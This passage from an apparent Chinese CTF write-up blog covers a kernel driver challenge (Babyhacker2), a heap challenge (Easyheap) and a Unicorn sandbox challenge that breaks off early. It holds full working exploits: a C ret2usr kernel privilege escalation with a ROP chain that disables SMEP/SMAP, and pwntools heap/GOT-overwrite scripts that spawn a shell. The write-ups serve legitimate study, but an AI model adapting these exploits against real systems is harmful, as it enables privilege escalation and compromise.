class="number">4</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Chunk[5]: &quot;</span>)</span><br><span class="line">heap_address = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&quot;heap address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_address)))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>, <span class="number">0x8</span>, p64(top_chunk_address - <span class="number">0x4b</span>))</span><br><span class="line">add(<span class="number">0x48</span>)  <span class="comment"># 2 = 5, overlap 8</span></span><br><span class="line">add(<span class="number">0x48</span>)  <span class="comment"># 4 main_arena chunk</span></span><br><span class="line"></span><br><span class="line">tcache_entry_address = heap_address - <span class="number">0x1f850</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0x43</span>, <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x3</span> + p64(<span class="number">0</span>) * <span class="number">7</span> + p64(tcache_entry_address))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>)  <span class="comment"># 9</span></span><br><span class="line">add(<span class="number">0x28</span>)  <span class="comment"># 10</span></span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x28</span>)  <span class="comment"># 12 tcache_entry</span></span><br><span class="line">edit(<span class="number">12</span>, <span class="number">0x28</span>, <span class="string">&quot;\x00&quot;</span> * <span class="number">0x28</span>)  <span class="comment"># overwrite tcache_entry</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x7ffff7fc18e8 &lt;__free_hook&gt;, 0x7ffff7fc0850 &lt;stdin&gt;</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0x43</span>, <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x3</span> + p64(<span class="number">0</span>) * <span class="number">7</span> + p64(libc.sym[<span class="string">&#x27;stdin&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">index_array = [<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    padding2(<span class="number">0x58</span>, index_array)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *$rebase(0x18a7)&quot;)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>) <span class="comment"># 9</span></span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">0x58</span>) <span class="comment"># 11</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">11</span>, <span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(libc.address + one_gadget))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.xiaocc.xyz/2018-05-28/AddressSanitizer/">内存检测工具AddressSanitizer</a></p><p><a href="https://zszcr.github.io/2019/03/26/2019-3-26-0CTFTCTF2019-PWN-%E5%A4%8D%E7%8E%B0/">0CTF/TCTF2019 PWN 复现</a></p><p><a href="https://sunichi.github.io/2019/03/27/TCTF-2019-babyheap/">TCTF 2019 babyheap</a></p><p><a href="https://e3pem.github.io/2019/04/26/0ctf-2019/0ctf2019-zerotask/">0ctf2019-zerotask题解</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>高校战疫网络安全分享赛 WP</title>
      <link href="/posts/213364399.html"/>
      <url>/posts/213364399.html</url>
      
        <content type="html"><![CDATA[<h2 id="Babyhacker2"><a href="#Babyhacker2" class="headerlink" title="Babyhacker2"></a>Babyhacker2</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先我们看一下<code>startvm.sh</code></p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200807185413.png" alt="图片无法显示，请联系作者" title=" "><p>有时间限制，并且开启了<code>kalsr,smep,smap</code>的保护。即内核不能访问用户空间的数据和代码，这个保护可以通过修改<code>cr4</code>寄存器来关闭。我们看一下虚拟机本身</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; initramfs.cpio</span><br></pre></td></tr></table></figure><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200807185715.png" alt="图片无法显示，请联系作者" title=" "><p>首先是加载了<code>babyhacker.ko</code>的驱动，这里驱动开启了<code>canary</code>和<code>NX</code>保护。接着将<code>dmesg_restrict/kptr_restrict</code>置为<code>0</code>意味着我们可以通过<code>cat kallsyms</code>查看<code>commit_creds/prepare_kernel_cred</code>两个函数的地址。通过<code>commit_creds(prepare_kernel_cred(0))</code>调用来实现提权。</p><p>漏洞出现在<code>0x30000</code>的操作处</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200807190111.png" alt="图片无法显示，请联系作者" title=" "><p>我们传入的<code>rdx</code>是一个<code>signedint</code>，因此我们可以通过输入负数来实现判断的绕过</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200807190219.png" alt="图片无法显示，请联系作者" title=" "><p>绕过判断之后就可以将<code>di</code>即后两个字节赋值给<code>buffersize</code>。由于读取和写入的操作是通过<code>buffersize</code>来控制的，因此我们可以实现栈内容的泄露和栈溢出覆盖返回地址<code>ROP</code>。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ul><li>修改<code>buffersize</code>的大小，泄露<code>canary,rbp,ret</code>的地址，实现内核基址的获取，绕过<code>kalsr,canary</code>。</li><li>修改<code>buffersize</code>的大小，将<code>rop</code>链写入到返回地址位置，关闭<code>smep,smap</code>，执行用户空间的提权代码提权，返回用户空间<code>getshell</code>。</li></ul><p>提权时采用的是<code>ret2usr</code>，即利用我们写好的函数进行提权操作。当执行两个内核空间的提权函数的时候，我们处于<code>ring0</code>级别，因此可以正常执行。但是要<code>getshell</code>需要返回用户空间去执行，这里利用到了<code>swags,iretq</code>来返回用户空间，但是在这之前需要我们保存<code>CS, flags, esp </code>等信息，供<code>iretq</code>使用。</p><blockquote><p>GDB调试</p><p>首先在qemu中lsmod找到babyhacker的加载基址0xffffffffc0000000，接着在gdb中执行</p><p>add-symbol-file babyhacker.ko 0xffffffffc0000000</p><p>b *0xffffffffc0000000+0x70</p><p>set architecture i386:x86-64:intel</p><p>target remote :1234 //getchar()</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> user_cs, user_ss, user_rflags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_stack = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> p_rdi_r = <span class="number">0xffffffff8109054d</span>;</span><br><span class="line"><span class="type">size_t</span> mv_rc4_rdi_p_rbp_r = <span class="number">0xffffffff81004d70</span>;</span><br><span class="line"><span class="type">size_t</span> rop[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span>&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getroot</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;push %2\n&quot;</span></span><br><span class="line">        <span class="string">&quot;swapgs\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %2\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %3\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %4\n&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq\n&quot;</span></span><br><span class="line">        :</span><br><span class="line">        :  <span class="string">&quot;r&quot;</span> (user_ss), <span class="string">&quot;r&quot;</span> (user_stack), <span class="string">&quot;r&quot;</span> (user_rflags), <span class="string">&quot;r&quot;</span> (user_cs), <span class="string">&quot;r&quot;</span> (get_shell)</span><br><span class="line">        : <span class="string">&quot;memory&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">    <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">    <span class="string">&quot;movq %%rsp, %2\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">    <span class="string">&quot;popq %3\n&quot;</span></span><br><span class="line">    : <span class="string">&quot;=r&quot;</span> (user_cs), <span class="string">&quot;=r&quot;</span> (user_ss), <span class="string">&quot;=r&quot;</span> (user_stack), <span class="string">&quot;=r&quot;</span> (user_rflags) : : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">save_state();</span><br><span class="line">commit_creds = <span class="number">0xffffffff810a1430</span>;</span><br><span class="line">prepare_kernel_cred = <span class="number">0xffffffff810a1820</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;/dev/babyhacker&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;open error\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">getchar();<span class="comment">//此处开始调试</span></span><br><span class="line"></span><br><span class="line">ioctl(fd, <span class="number">0x30000</span>, <span class="number">0xf000ffff</span>);</span><br><span class="line"><span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">ioctl(fd, <span class="number">0x30002</span>, buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// int i = 0;</span></span><br><span class="line"><span class="comment">// for(i = 0; i&lt; 0x50; i++)&#123;</span></span><br><span class="line"><span class="comment">// printf(&quot;%x--%zx\n&quot;, i, buf[i]);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> canary = buf[<span class="number">40</span>];</span><br><span class="line"><span class="type">size_t</span> orl_ebp = buf[<span class="number">41</span>];</span><br><span class="line"><span class="type">size_t</span> ret_address = buf[<span class="number">42</span>];</span><br><span class="line"><span class="type">size_t</span> offset = <span class="number">0xffffffff81219218</span> - ret_address;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;canary: %p--  ret_address: %p -- offset: %d\n&quot;</span>, canary, ret_address, offset);</span><br><span class="line"></span><br><span class="line">commit_creds += offset;</span><br><span class="line">prepare_kernel_cred += offset;</span><br><span class="line">p_rdi_r += offset;</span><br><span class="line">mv_rc4_rdi_p_rbp_r += offset;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;commit_creds : %p\nprepare_kernel_cred: %p\n&quot;</span>, commit_creds, prepare_kernel_cred);</span><br><span class="line">ioctl(fd, <span class="number">0x30000</span>, <span class="number">0xf000ffff</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> index = <span class="number">40</span>;</span><br><span class="line">rop[index++] = canary;</span><br><span class="line">rop[index++] = orl_ebp;</span><br><span class="line">rop[index++] = p_rdi_r;</span><br><span class="line">rop[index++] = <span class="number">0x6f0</span>;</span><br><span class="line">rop[index++] = mv_rc4_rdi_p_rbp_r;</span><br><span class="line">rop[index++] = orl_ebp;</span><br><span class="line">rop[index++] = getroot;</span><br><span class="line">ioctl(fd, <span class="number">0x30001</span>, rop);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Easyheap"><a href="#Easyheap" class="headerlink" title="Easyheap"></a>Easyheap</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>程序一共提供了三种功能分别是<code>add,delete,edit</code>。注意到在<code>delete</code>的时候已经将指针清空，最多同时存在三个指针，用户申请的内存的最大大小为<code>0x400</code>。但是在<code>add</code>的时候，判断用户大小的逻辑处出了问题</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200807223321.png" alt="图片无法显示，请联系作者" title=" "><p>注意到在判断逻辑之前指针已经被赋值到<code>ptr</code>中了，而当用户输入的大小大于<code>0x400</code>的时候并没有释放这一部分内存，清空这一部分的指针。</p><p>假如我们之前申请了两次<code>0x50</code>大小的堆块，并全部释放，此时<code>fastbin</code>中存在两个<code>0x20</code>大小的堆块。此时申请大于<code>0x400</code>的堆块的时候，<code>ptr[0]</code>中的指针会是最后一次释放的<code>fastbin</code>，并且<code>fd</code>指针指向下一个<code>fastbin</code>，<code>size</code>没有被清空的情况下，我们就可以通过<code>edit</code>控制下一个<code>fastbin</code>堆块内容。</p><p><code>0x10</code>大小的堆块标识如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typeof <span class="class"><span class="keyword">struct</span> <span class="title">con</span>&#123;</span></span><br><span class="line">    <span class="type">char</span>* content;</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><ul><li><p>申请大小为<code>0x40,0x50</code>的堆块，并释放。此时申请<code>0x500,0x20,0x50</code>的堆块，堆布局如下</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200807224350.png" alt="图片无法显示，请联系作者" title=" "><p>此时我们修改<code>ptr[0]</code>使得<code>ptr[1]</code>的<code>content</code>指向<code>ptr[2]</code>，也就是将<code>0x603000</code>的最后一个字节覆写为<code>0x30</code>，这样<code>edit ptr[0]</code>就可以更改<code>ptr[1]</code>的<code>content</code>为我们想要任意写的内存地址，此时<code>edit ptr[1]</code>就是向我们想要写的内存地址处写内容了。实现了任意写。</p></li><li><p>通过<code>edit ptr[1],ptr[2]</code>实现的任意写将<code>free.got</code>改写为<code>puts.plt</code>，将<code>ptr[2]</code>的<code>content</code>改写为想要泄露地址的函数的<code>got</code>地址，就可以泄露到的<code>libc</code>基址。</p></li><li><p>通过<code>edit ptr[0],ptr[1]</code>实现的任意写将<code>atoi</code>的地址改写为<code>system</code>，输入<code>/bin/sh</code>进行<code>getshell</code>。</p></li></ul><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./easyheap&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b*0x400B98\n&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/home/pwn/Desktop/glibc/x64/glibc-2.23/lib/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;this message?\n&quot;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    <span class="keyword">if</span> length &lt;= <span class="number">0x400</span>:</span><br><span class="line">        p.sendafter(<span class="string">&quot;the message?\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;to be deleted?\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;be modified?\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;the message?\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message_exit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>, <span class="string">&quot;0&quot;</span>) <span class="comment"># 0x20 0x50</span></span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">&quot;1&quot;</span>) <span class="comment"># 0x20 # 0x60</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>, <span class="string">&quot;12&quot;</span>) <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&quot;12&quot;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">&quot;12&quot;</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">padding = p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">0</span>, padding + <span class="string">b&quot;\x30&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">edit(<span class="number">2</span>, p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">edit(<span class="number">1</span>, p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, padding + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Easy-unicorn"><a href="#Easy-unicorn" class="headerlink" title="Easy_unicorn"></a>Easy_unicorn</h2><h3 id="unicorn"><a href="#unicorn" class="headerlink" title="unicorn"></a>unicorn</h3><p>可以看这篇<a href="https://bbs.pediy.com/thread-253868.htm">分析文章</a></p><p><code>Unicorn</code>是一款基于<code>qemu</code>模拟器的模拟执行框架，支持<code>Arm，Mips</code>等多种指令集，为包含<code>c++,python,java</code>在内的多种语言提供了编程接口，其<code>DLL</code>可以被更多的语言调用。</p><p><code>Unicorn</code>采用虚拟内存基址，通过<code>uc_mem_map,uc_mem_read,uc_mem_write</code>的<code>api</code>来控制虚拟内存，<code>map</code>时需要与<code>0x1000</code>内存对齐。想要<code>Unicorn</code>模拟执行代码，则首先要将代码加载到虚拟内存中。</p><p><code>unicorn</code>中存在<code>hook</code>机制，调用<code>add_hook</code>即可添加一个<code>hook</code>。<code>Unicorn</code>的<code>hook</code>是链式的，也就是可以添加多个同类型的<code>hook</code>，<code>Unicorn</code>会依次调用每一个<code>handler</code>。这里我们主要关注四种类型的<code>hook</code></p><ul><li><code>UC_HOOK_INTR,1&lt;&lt;0</code> 中断</li><li><code>UC_HOOK_INSN,1&lt;&lt;1</code>，系统调用和中断</li><li><code>UC_HOOK_CODE,1&lt;&lt;2</code>，执行每一行代码时触发<code>hook</code></li><li><code>UC_HOOK_MEM_READ,1&lt;&lt;10</code> 内存写</li><li><code>UC_HOOK_MEM_WRITE,1&lt;&lt;11</code> 内存读取</li></ul><p><code>add_hook</code>的函数原型如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">uc_err <span class="title function_">uc_hook_add</span><span class="params">(uc_engine *uc, uc_hook *hh, <span class="type">int</span> type, <span class="type">void</span> *callback,</span></span><br><span class="line"><span class="params">        <span class="type">void</span> *user_data, <span class="type">uint64_t</span> begin, <span class="type">uint64_t</span> end, ...)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">uc: uc_open() 返回的句柄</span></span><br><span class="line"><span class="comment">hh: 注册hook得到的句柄</span></span><br><span class="line"><span class="comment">type: hook 类型</span></span><br><span class="line"><span class="comment">callback: hook的会回调函数</span></span><br><span class="line"><span class="comment">user_data: 用户自定义数据. 将被传递给回调函数的最后一个参数user_data</span></span><br><span class="line"><span class="comment">begin:hook作用范围的起始地址(包括)</span></span><br><span class="line"><span class="comment">end: 作用范围的结束地址，默认为所有代码，当begin &gt; end时触发此hook类型时都会调用回调</span></span><br><span class="line"><span class="comment">...: 变量参数 (取决于 type)</span></span><br><span class="line"><span class="comment">return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="Sandbox分析"><a href="#Sandbox分析" class="headerlink" 